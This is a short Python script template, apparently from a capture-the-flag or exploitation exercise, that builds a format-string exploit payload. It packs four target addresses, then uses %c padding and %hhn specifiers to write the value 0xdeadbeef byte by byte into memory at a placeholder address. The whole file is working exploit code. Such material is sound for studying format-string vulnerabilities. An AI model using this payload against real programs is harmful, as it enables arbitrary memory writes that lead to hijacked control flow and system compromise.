#!/usr/bin/env python3
import struct, sys

t = {target_addr}
base = {offset}

# deadbeef (little endian)
vals = [0xef, 0xbe, 0xad, 0xde]

payload  = struct.pack("<I", t)
payload += struct.pack("<I", t+1)
payload += struct.pack("<I", t+2)
payload += struct.pack("<I", t+3)

count = 16  # 주소 4개 = 16바이트 출력

for i, v in enumerate(vals):
    pad = (v - count) % 256
    if pad:
        payload += f"%1${pad}c".encode()
        count += pad
    payload += f"%{base+i}$hhn".encode()

payload += b"\n"
sys.stdout.buffer.write(payload)
